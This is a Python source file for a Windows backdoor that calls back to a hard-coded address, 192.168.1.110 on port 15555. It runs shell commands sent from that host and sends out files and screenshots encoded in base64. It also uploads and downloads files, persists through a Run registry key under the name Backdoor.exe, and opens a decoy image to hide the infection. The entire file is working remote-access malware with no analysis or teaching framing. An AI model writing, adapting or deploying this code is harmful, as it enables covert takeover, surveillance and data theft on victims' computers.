#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
from mss import mss

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())


def reliable_recv():    
    json_data = ''
    while True:
        try :
            json_data = json_data + sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def screenshot():
    with mss() as sct:
        sct.shot(output='monitor-1.png')
        print("[DEBUG] Screenshot saved.")

def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)

def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(('192.168.1.110', 15555))
            shell()
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == 'download':
            try:
                with open(command[9:], 'rb') as file:
                    reliable_send(base64.b64encode(file.read()).decode())
            except:
                reliable_send(base64.b64encode(b'Failed to read file'))
        elif command[:3] == "get":
            try:
                download (command[4:])
                reliable_send('[+] Downloaded File From Specified URL!')
            except:
                reliable_send('[!!]Failed To Download File!')
        elif command[:5] == 'start':
                try:
                    subprocess.Popen(command[6:], shell=True)
                    reliable_send('[+] Started!')
                except:
                    reliable_send('[!!] Failed To Start Program!')
        elif command[:10] == 'screenshot':
            try:
                screenshot()
                if not os.path.exists('monitor-1.png') or os.path.getsize('monitor-1.png') == 0:
                    reliable_send(base64.b64encode(b'[!!] Screenshot file is empty or missing').decode())
                else:
                    with open('monitor-1.png', 'rb') as sc:
                        reliable_send(base64.b64encode(sc.read()).decode())
                    os.remove('monitor-1.png')
            except Exception as e:
                reliable_send(base64.b64encode(f"[!!] Failed to capture screenshot: {e}".encode()).decode())
        elif command[:6] == 'upload':
            with open(command[7:], 'wb') as fin:
                result = reliable_recv()
                fin.write(base64.b64decode(result))
            continue
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = (proc.stdout.read() + proc.stderr.read()).decode()
                reliable_send(result)
            except:
                reliable_send("[!!] Can't Execute the Command")

location = os.environ['appdata'] + '\\Backdoor.exe'
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True)

    name = sys._MEIPATH + '\poa.jpg'
    try:
        subprocess.Popen(name, shell=True)
    except:
        pass

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()
